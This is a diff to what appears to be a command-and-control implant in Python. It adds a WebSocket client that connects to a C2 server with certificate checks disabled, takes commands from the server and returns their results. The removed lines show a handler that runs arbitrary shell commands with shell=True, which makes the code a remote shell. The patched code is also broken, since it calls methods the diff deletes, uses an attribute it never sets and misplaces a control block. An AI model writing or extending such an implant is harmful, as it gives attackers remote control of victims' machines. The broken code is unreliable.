@@ -598,18 +598,47 @@ class WebSocketClient:
     def __init__(self, agent_id, crypto, server_url):
         self.agent_id = agent_id
         self.crypto = crypto
+        # Ensure proper WebSocket URL format
         self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/terminal'
         self.socket = None
         self.running = False
         self.current_dir = os.getcwd()
+        self.connected = False
+        self.connection_attempts = 0
+        self.max_attempts = 3
 
     def connect(self):
         try:
-            self.socket = socketio.Client(ssl_verify=False)
-            
+            if self.connection_attempts >= self.max_attempts:
+                if self.config.DEBUG:
+                    print("[!] Max connection attempts reached")
+                return False
+
+            self.connection_attempts += 1
+            self.socket = socketio.Client(
+                ssl_verify=False,
+                reconnection=True,
+                reconnection_attempts=3,
+                reconnection_delay=1000,
+                logger=self.config.DEBUG,
+                engineio_logger=self.config.DEBUG
+            )
+
+            @self.socket.on('connect')
+            def on_connect():
+                if self.config.DEBUG:
+                    print("[+] WebSocket connected, authenticating...")
+                auth_data = {
+                    'agent_id': self.agent_id,
+                    'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
+                }
+                self.socket.emit('agent_connect', auth_data)
+
             @self.socket.on('command')
-            def handle_command(data):
+            def on_command(data):
                 try:
+                    if self.config.DEBUG:
+                        print(f"[+] Received command: {data['command']}")
                     result = self._execute_command(data['command'])
                     self.socket.emit('command_result', {
                         'agent_id': self.agent_id,
@@ -617,86 +646,48 @@ class WebSocketClient:
                         'output': result.get('output', ''),
                         'error': result.get('error', ''),
                         'current_dir': result.get('current_dir', ''),
-                        'status': result.get('status', 'error')
+                        'status': 'success' if not result.get('error') else 'error'
                     })
                 except Exception as e:
+                    if self.config.DEBUG:
+                        print(f"[!] Command execution error: {str(e)}")
                     self.socket.emit('command_error', {
                         'agent_id': self.agent_id,
                         'error': str(e)
                     })
 
             @self.socket.on('disconnect')
-            def handle_disconnect():
-                self.running = False
+            def on_disconnect():
+                self.connected = False
+                if self.config.DEBUG:
+                    print("[!] WebSocket disconnected")
 
-            self.socket.connect(self.server_url)
-            self.socket.emit('agent_connect', {
-                'agent_id': self.agent_id,
-                'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
-            })
+            @self.socket.on('connect_error')
+            def on_connect_error(data):
+                if self.config.DEBUG:
+                    print(f"[!] WebSocket connection error: {str(data)}")
+
+            self.socket.connect(
+                self.server_url,
+                headers={
+                    'User-Agent': self.config.USER_AGENT,
+                    'X-Agent-ID': self.agent_id
+                },
+                transports=['websocket']
+            )
             
             self.running = True
+            self.connected = True
+            if self.config.DEBUG:
+                print("[+] WebSocket connection established")
             return True
+
         except Exception as e:
-            if Config.DEBUG:
-                print(f"[!] WebSocket connection error: {str(e)}")
+            if self.config.DEBUG:
+                print(f"[!] WebSocket connection failed: {str(e)}")
             return False
-
-    def _execute_command(self, command):
-        try:
-            if command.lower().startswith('cd '):
-                new_dir = command[3:].strip()
-                try:
-                    if new_dir:
-                        os.chdir(new_dir)
-                    self.current_dir = os.getcwd()
-                    return {
-                        'status': 'success',
-                        'output': f"Current directory is now: {self.current_dir}",
-                        'current_dir': self.current_dir
-                    }
-                except Exception as e:
-                    return {
-                        'status': 'error',
-                        'error': str(e),
-                        'current_dir': self.current_dir
-                    }
-
-            result = subprocess.run(
-                command,
-                shell=True,
-                cwd=self.current_dir,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                timeout=30
-            )
-
-            self.current_dir = os.getcwd()
-            return {
-                'status': 'success',
-                'output': result.stdout,
-                'error': result.stderr,
-                'current_dir': self.current_dir
-            }
-        except subprocess.TimeoutExpired:
-            return {
-                'status': 'error',
-                'error': 'Command timed out after 30 seconds',
-                'current_dir': self.current_dir
-            }
-        except Exception as e:
-            return {
-                'status': 'error',
-                'error': str(e),
-                'current_dir': self.current_dir
-            }
-
-    def disconnect(self):
-        if self.socket:
-            self.socket.disconnect()
-        self.running = False
-
+        
+        
 # ======================
 # Main Agent Class
 # ======================
@@ -931,27 +922,46 @@ class Agent:
             
             elif task_type == "websocket":
                 action = task.get("action")
-                if action == "start":
-                    if not self.ws_client or not self.ws_client.running:
-                        self.ws_client = WebSocketClient(
-                            self.agent_id,
-                            self.crypto,
-                            self.config.C2_SERVER
-                        )
-                        connected = self.ws_client.connect()
-                        if connected:
-                            return {"status": "success", "message": "WebSocket connected"}
-                        else:
-                            return {"status": "error", "message": "WebSocket connection failed"}
-                else:
-                    if self.ws_client and self.ws_client.running:
-                        self.ws_client.disconnect()
-                        return {"status": "success", "message": "WebSocket disconnected"}
+            if action == "start":
+                if not self.ws_client or not self.ws_client.connected:
+                    self.ws_client = WebSocketClient(
+                        self.agent_id,
+                        self.crypto,
+                        self.config.C2_SERVER
+                    )
+                    connected = self.ws_client.connect()
+                    if connected:
+                        return {
+                            "status": "success", 
+                            "message": "WebSocket connection established",
+                            "action": "start"
+                        }
                     else:
-                        return {"status": "error", "message": "No active WebSocket connection"}
-            
+                        return {
+                            "status": "error", 
+                            "message": "WebSocket connection failed",
+                            "action": "start"
+                        }
+                else:
+                    return {
+                        "status": "success", 
+                        "message": "WebSocket already connected",
+                        "action": "start"
+                    }
             else:
-                return {"status": "error", "message": "Unknown task type"}
+                if self.ws_client and self.ws_client.connected:
+                    self.ws_client.disconnect()
+                    return {
+                        "status": "success", 
+                        "message": "WebSocket disconnected",
+                        "action": "stop"
+                    }
+                else:
+                    return {
+                        "status": "error", 
+                        "message": "No active WebSocket connection",
+                        "action": "stop"
+                    }
         
         except Exception as e:
             return {"status": "error", "message": str(e)}
